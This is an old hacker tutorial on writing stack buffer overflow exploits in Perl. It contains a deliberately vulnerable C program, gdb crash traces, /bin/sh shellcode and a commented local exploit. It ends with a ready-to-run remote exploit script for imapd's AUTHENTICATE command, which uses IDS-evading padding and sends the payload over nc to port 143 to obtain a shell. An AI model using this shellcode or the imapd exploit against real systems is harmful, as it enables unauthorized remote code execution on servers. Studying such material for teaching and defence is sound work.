<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
<META NAME="Generator" CONTENT="Microsoft Word 97">
<TITLE>writing buffer overflow exploits with perl</TITLE>
<META NAME="Template" CONTENT="C:\Program Files\Microsoft Office\Office\html.dot">
</HEAD>
<BODY LINK="#0000ff" VLINK="#800080">

<FONT FACE="Comic Sans MS"><P>-- Writing Buffer Overflow Exploits with Perl - anno 2000 --</P>
<P>&#9; &lt;teleh0r@doglover.com&gt; - http://teleh0r.cjb.net/</P>
<P>  ==============================================================</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P> Table of Contents:</P>
<P>~~~~~~~~~~~~~~~~~~~~</P>
<P>&nbsp;</P>
<P> [ 1.   Introduction</P>
<P> [ 2.   Vulnerable Program Example</P>
<P> [ 3.   Shellcode</P>
<P>&nbsp;</P>
<P> [ 4.   Designing the payload</P>
<P> [ 5.   Explained Example Exploit</P>
<P> [ 6.   Old Remote Imapd example exploit</P>
<P>&nbsp;</P>
<P> [ 7.   Links &amp; Resources</P>
<P>&nbsp;</P>
<P>-----------------------------------------------------------------------------</P>
<P>&nbsp;</P>
<P> Introduction:</P>
<P>~~~~~~~~~~~~~~~</P>
<P>&nbsp;</P>
<P>This paper is for those who want a practical approach to writing buffer overflow</P>
<P>exploits. As the title says, this text will teach you how to write these exploits</P>
<P>in Perl.</P>
<P>&nbsp;</P>
<P>If you want a more in-depth guide, please take a look at the links provided at the</P>
<P>end of this paper, and read those instead.</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P> Vulnerable Program Example:</P>
<P>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</P>
<P>&nbsp;</P>
<P>Ok, time for a example. I have written a small program which is exploitable to a</P>
<P>buffer overflow. strcpy() does not check the length of $KIDVULN before it starts</P>
<P>placing its contents onto the stack, thus making the below program exploitable.</P>
<P>&nbsp;</P>
<P>-----------------------------------------------------------------------------</P>
<P>++ vuln.c</P>
<P>&nbsp;</P>
<P>#include &lt;stdio.h&gt;</P>
<P>int main() {</P>
<P>  char kidbuffer[1024];</P>
<P>&nbsp;</P>
<P>  if (getenv("KIDVULN") == NULL) {</P>
<P>    fprintf(stderr, "Grow up!\n");</P>
<P>    exit(1);</P>
<P>  }</P>
<P>&nbsp;</P>
<P>  /* Read the environment variable data into the buffer */</P>
<P>  strcpy(kidbuffer, (char *)getenv("KIDVULN"));</P>
<P>&nbsp;</P>
<P>  printf("Environment variable KIDVULN is:\n\"%s\".\n\n", kidbuffer);</P>
<P>  printf("Isn't life wonderful in kindergarten?\n");</P>
<P>  return 0;</P>
<P>}</P>
<P>&nbsp;</P>
<P>++ end</P>
<P>-----------------------------------------------------------------------------</P>
<P>&nbsp;</P>
<P>[root@localhost teleh0r]# gcc -o vuln vuln.c</P>
<P>vuln.c: In function `main':</P>
<P>vuln.c:5: warning: comparison between pointer and integer</P>
<P>[root@localhost teleh0r]# export KIDVULN=`perl -e '{print "A"x"1028"}'`</P>
<P>[root@localhost teleh0r]# gdb vuln</P>
<P>GNU gdb 19991004</P>
<P>Copyright 1998 Free Software Foundation, Inc.</P>
<P>GDB is free software, covered by the GNU General Public License, and you are</P>
<P>welcome to change it and/or distribute copies of it under certain conditions.</P>
<P>Type "show copying" to see the conditions.</P>
<P>There is absolutely no warranty for GDB.  Type "show warranty" for details.</P>
<P>This GDB was configured as "i386-redhat-linux"...</P>
<P>(gdb) r</P>
<P>Starting program: /home/teleh0r/vuln</P>
<P>Environment variable KIDVULN is:</P>
<P>"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</P>
<P>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</P>
<P>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</P>
<P>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</P>
<P>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</P>
<P>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</P>
<P>&lt;snip&gt;</P>
<P>&nbsp;</P>
<P>Isn't life wonderful in kindergarten?</P>
<P>&nbsp;</P>
<P>Program received signal SIGSEGV, Segmentation fault.</P>
<P>0x40032902 in __libc_start_main (main=Cannot access memory at address 0x41414149</P>
<P>) at ../sysdeps/generic/libc-start.c:61</P>
<P>61      ../sysdeps/generic/libc-start.c: No such file or directory.</P>
<P>(gdb)</P>
<P>&nbsp;</P>
<P>-----------------------------------------------------------------------------</P>
<P>&nbsp;</P>
<P>Ok, here we can see that our buffer size wasn't big enough. Had it been, then</P>
<P>the stack pointer would have been overwritten and the EIP register would have</P>
<P>been 0x41414141. (41 == A in hex.)</P>
<P>&nbsp;</P>
<P>-----------------------------------------------------------------------------</P>
<P>&nbsp;</P>
<P>[root@localhost teleh0r]# export KIDVULN=`perl -e '{print "A"x"1032"}'`</P>
<P>[root@localhost teleh0r]# gdb vuln</P>
<P>GNU gdb 19991004</P>
<P>Copyright 1998 Free Software Foundation, Inc.</P>
<P>GDB is free software, covered by the GNU General Public License, and you are</P>
<P>welcome to change it and/or distribute copies of it under certain conditions.</P>
<P>Type "show copying" to see the conditions.</P>
<P>There is absolutely no warranty for GDB.  Type "show warranty" for details.</P>
<P>This GDB was configured as "i386-redhat-linux"...</P>
<P>(gdb) r</P>
<P>Starting program: /home/teleh0r/vuln</P>
<P>Environment variable KIDVULN is:</P>
<P>"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</P>
<P>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</P>
<P>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</P>
<P>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</P>
<P>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</P>
<P>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</P>
<P>&lt;snip&gt;</P>
<P>&nbsp;</P>
<P>Isn't life wonderful in kindergarten?</P>
<P>&nbsp;</P>
<P>Program received signal SIGSEGV, Segmentation fault.</P>
<P>0x41414141 in ?? ()</P>
<P>(gdb)</P>
<P>&nbsp;</P>
<P>-----------------------------------------------------------------------------</P>
<P>&nbsp;</P>
<P>Now, we have totally overwritten the old return adress. We now see that it</P>
<P>holds 4 A's. So what does this mean? Well, we can controll where EIP points to,</P>
<P>and therefore we can get EIP to point to our payload. If this is successful our</P>
<P>code will get executed on the stack.</P>
<P>&nbsp;</P>
<P>(Some operative systems/patches may prevent code being executed on the stack).</P>
<P>&nbsp;</P>
<P>-----------------------------------------------------------------------------</P>
<P>&nbsp;</P>
<P>We now know the length we will use to completely overwrite the return address.</P>
<P>Since ESP points to the top of the stack, we can use the value of ESP when the</P>
<P>program died, and (if needed) add a offset to it.</P>
<P>&nbsp;</P>
<P>This is how you get the stack pointer value to use your exploit.</P>
<P>&nbsp;</P>
<P>Program received signal SIGSEGV, Segmentation fault.</P>
<P>0x41414141 in ?? ()</P>
<P>(gdb) info reg esp</P>
<P>esp            0xbffff770       -1073744064</P>
<P>(gdb)</P>
<P>&nbsp;</P>
<P>-----------------------------------------------------------------------------</P>
<P>&nbsp;</P>
<P> Shellcode:</P>
<P>~~~~~~~~~~~~</P>
<P>&nbsp;</P>
<P>If you want to learn how to write your own shellcode, please take a look at the</P>
<P>links provided at the end of this paper. If you are lazy, and since you code in</P>
<P>Perl, chances are high, you could use tools which will make the shellcode for you.</P>
<P>Hellkit and execve-shell are good examples of such programs (great tools).</P>
<P>&nbsp;</P>
<P>(You will find these tools at: http://teso.scene.at/)</P>
<P>&nbsp;</P>
<P>[root@localhost execve-shell]# ./shellxp /bin/sh</P>
<P>build exploit shellcode</P>
<P>-scut / teso.</P>
<P>&nbsp;</P>
<P>constructing shellcode...</P>
<P>&nbsp;</P>
<P>[ 39/2048] adding ( 7): /bin/sh</P>
<P>shellcode size: 47 bytes</P>
<P>&nbsp;</P>
<P>/* 47 byte shellcode */</P>
<P>"\xeb\x1f\x5f\x89\xfc\x66\xf7\xd4\x31\xc0\x8a\x07"</P>
<P>"\x47\x57\xae\x75\xfd\x88\x67\xff\x48\x75\xf6\x5b"</P>
<P>"\x53\x50\x5a\x89\xe1\xb0\x0b\xcd\x80\xe8\xdc\xff"</P>
<P>"\xff\xff\x01\x2f\x62\x69\x6e\x2f\x73\x68\x01";</P>
<P>&nbsp;</P>
<P>-----------------------------------------------------------------------------</P>
<P>&nbsp;</P>
<P> Designing the payload:</P>
<P>~~~~~~~~~~~~~~~~~~~~~~~~</P>
<P>&nbsp;</P>
<P>The payload will be stored in the $buffer scalar, with the data which will be</P>
<P>used for the exploitation. It will have the length needed to completely overwrite</P>
<P>the old return address. We will insert this code into the targeted program</P>
<P>(user-input) in order to change its flow.</P>
<P>&nbsp;</P>
<P>The payload will in most cases look like this:</P>
<P>&nbsp;</P>
<P>N = NOP (0x90) / S = Shellcode / R = ESP (+ offset).</P>
<P>&nbsp;</P>
<P>Buffer: [ NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNSSSSSSSRRRRRRRRRRRRRR ]</P>
<P>&nbsp;</P>
<P>There are reasons why we construct the buffer this way. First we have a lot of</P>
<P>NOPs, then the shellcode (which in this example will execute /bin/sh), and at last</P>
<P>the ESP + offset values.</P>
<P>&nbsp;</P>
<P>The EIP register will get loaded with the value pointed to by ESP. So if ESP</P>
<P>points to anywhere inside the NOPs, the NOPs will do "no operations", and</P>
<P>continue to do nothing until the processor reaches the shellcode and then</P>
<P>executes it. (See the figure below)</P>
<P>&nbsp;</P>
<P>&#9;_______________________________________________</P>
<P>&lt;---- |[ NNNNNNNNNNNNNNNNNNNNNNNNNNN-SHELLCODE-RRRRRRR ]| &lt;----</P>
<P>&#9; \_________________________/ ----&gt;   #&#9;  ^</P>
<P> &#9;         ^ &#9;        &#9;&#9;  |</P>
<P>&#9; &#9; |________________________________|</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>If the buffer we were trying to overflow had been too small to add a decent</P>
<P>amount of NOP's, the shellcode and RET's, the below layout could have been</P>
<P>used when constructing the payload. (We could have added the NOP's and shellcode</P>
<P>into a shell-variable as well)</P>
<P>&nbsp;</P>
<P>(R = Stack Pointer + Offset / S = Shellcode / N = x86 NOP)</P>
<P>&nbsp;</P>
<P>           / ESP + offset /  NOP's /  Shellcode</P>
<P>Payload: [ RRRRRRRRRRRRRRRNNNNNNNNNNNNNNNNNNSSSSSS ]</P>
<P>                      |          |   ----------&gt; #</P>
<P>                       ----------</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>(Note: The buffer cannot contain any NULL bytes!)</P>
<P>&nbsp;</P>
<P>-----------------------------------------------------------------------------</P>
<P>&nbsp;</P>
<P> Explained Example Exploit:</P>
<P>~~~~~~~~~~~~~~~~~~~~~~~~~~~~</P>
<P>&nbsp;</P>
<P>#!/usr/bin/perl</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>$shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89".</P>
<P>             "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c".</P>
<P>             "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff".</P>
<P>             "\xff\xff/bin/sh";</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>$len = 1024 + 8;    # The length needed to own EIP.</P>
<P>$ret = 0xbffff770;  # The stack pointer at crash time.</P>
<P>$nop = "\x90";      # x86 NOP</P>
<P>$offset = -1000;    # Default offset to try.</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>if (@ARGV == 1) {</P>
<P>    $offset = $ARGV[0];</P>
<P>}</P>
<P>&nbsp;</P>
<P>for ($i = 0; $i &lt; ($len - length($shellcode) - 100); $i++) {</P>
<P>    $buffer .= $nop;</P>
<P>}</P>
<P>&nbsp;</P>
<P># [ Buffer: NNNNNNNNNNNNNN ]</P>
<P>&nbsp;</P>
<P># Add a lot of x86 NOP's to the buffer scalar. (885 NOP's)</P>
<P>&nbsp;</P>
<P>$buffer .= $shellcode;</P>
<P>&nbsp;</P>
<P># [ Buffer: NNNNNNNNNNNNNNSSSSS ]</P>
<P>&nbsp;</P>
<P># Then we add the shellcode to the buffer. We made room for the shellcode</P>
<P># above.</P>
<P>&nbsp;</P>
<P>print("Address: 0x", sprintf('%lx',($ret + $offset)), "\n");</P>
<P>&nbsp;</P>
<P># Here we add the offset to the stack pointer value - convert it to hex,</P>
<P># and then print it out.</P>
<P>&nbsp;</P>
<P>$new_ret = pack('l', ($ret + $offset));</P>
<P>&nbsp;</P>
<P># pack is a function which will take a list of values and pack it into a</P>
<P># binary structure, and then return that string containing the structure.</P>
<P># So, pack the stack pointer / ESP + offset into a signed long - (4 bytes).</P>
<P>&nbsp;</P>
<P>for ($i += length($shellcode); $i &lt; $len; $i += 4) {</P>
<P>    $buffer .= $new_ret;</P>
<P>}</P>
<P>&nbsp;</P>
<P># [ Buffer: NNNNNNNNNNNNNNNNSSSSSRRRRRR ]</P>
<P>&nbsp;</P>
<P># Here we add the length of the shellcode to the scalar $i, which after the</P>
<P># first for loop had finished held the value "885" (bytes), then the for loop</P>
<P># adds the $new_ret scalar until $buffer has the size of 1032 bytes.</P>
<P>#</P>
<P># Could also have been written as this:</P>
<P>#</P>
<P># until (length($buffer) == $len) {</P>
<P>#    $buffer .= $new_ret;</P>
<P>#}</P>
<P>&nbsp;</P>
<P>local($ENV{'KIDVULN'}) = $buffer; exec("/bin/vuln");</P>
<P>&nbsp;</P>
<P># Copy it into the shell variable KIDVULN, and execute vuln.</P>
<P>&nbsp;</P>
<P>-----------------------------------------------------------------------------</P>
<P>&nbsp;</P>
<P>#!/usr/bin/perl</P>
<P>&nbsp;</P>
<P>## *** Successfully tested on IMAP4rev1 v10.190</P>
<P>## Written by: teleh0r@doglover.com / anno 2000</P>
<P>##</P>
<P>## This is nothing new - written just for fun.</P>
<P>## Vulnerable: imapd versions 9.0 &gt; 10.223 / CA.</P>
<P>&nbsp;</P>
<P># Shellcode stolen from imapx.c / The Tekneeq Crew</P>
<P>&nbsp;</P>
<P>$shellcode ="\xeb\x35\x5e\x80\x46\x01\x30\x80\x46\x02\x30\x80".</P>
<P>&#9;    "\x46\x03\x30\x80\x46\x05\x30\x80\x46\x06\x30\x89".</P>
<P>&#9;    "\xf0\x89\x46\x08\x31\xc0\x88\x46\x07\x89\x46\x0c".</P>
<P>&#9;    "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80".</P>
<P>&#9;    "\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xc6\xff\xff\xff".</P>
<P>&#9;    "\x2f\x32\x39\x3e\x2f\x43\x38";</P>
<P>&nbsp;</P>
<P>$len = 1052;       # Sufficient to overwrite the return value.</P>
<P>$nop = A;          # Using A (0x41) 'as' NOP's to try to fool IDS.</P>
<P>$ret = 0xbffff30f; # Return Value / ESP / Stack Pointer.</P>
<P>&nbsp;</P>
<P>if (@ARGV &lt; 2) {</P>
<P>    print("Usage: $0 &lt;target&gt; &lt;offset&gt;\n");</P>
<P>    exit(1);</P>
<P>}</P>
<P>&nbsp;</P>
<P>($target, $offset) = @ARGV;</P>
<P>&nbsp;</P>
<P>for ($i = 0; $i &lt; ($len - length($shellcode) - 100); $i++) {</P>
<P>    $buffer .= $nop;</P>
<P>}</P>
<P>&nbsp;</P>
<P>$buffer .= $shellcode;</P>
<P>$new_ret = pack('l', ($ret + $offset));</P>
<P>&nbsp;</P>
<P>$address = sprintf('%lx', ($ret + $offset));</P>
<P>print("Address: 0x$address / Offset: $offset / Length: $len\n\n");</P>
<P>sleep(1);</P>
<P>&nbsp;</P>
<P>for ($i += length($shellcode); $i &lt; $len; $i += 4) {</P>
<P>    $buffer .= $new_ret;</P>
<P>}</P>
<P>&nbsp;</P>
<P>$exploit_string = "* AUTHENTICATE {$len}\015\012$buffer\012";</P>
<P>&nbsp;</P>
<P>system("(echo -e \"$exploit_string\" ; cat) | nc $target 143");</P>
<P>&nbsp;</P>
<P>-----------------------------------------------------------------------------</P>
<P>&nbsp;</P>
<P> Links &amp; Resources:</P>
<P>~~~~~~~~~~~~~~~~~~~~</P>
<P>&nbsp;</P>
<P>Smashing The Stack For Fun And Profit by Aleph One</P>
<P>http://phrack.infonexus.com/search.phtml?view&amp;article=p49-14</P>
<P>&nbsp;</P>
<P>Writing buffer overflow exploits - a tutorial for beginners.</P>
<P>http://mixter.warrior2k.com/exploit.txt / Written by Mixter.</P>
<P>&nbsp;</P>
<P>TESO Security Group / http://teso.scene.at/</P>
</FONT></BODY>
</HTML>
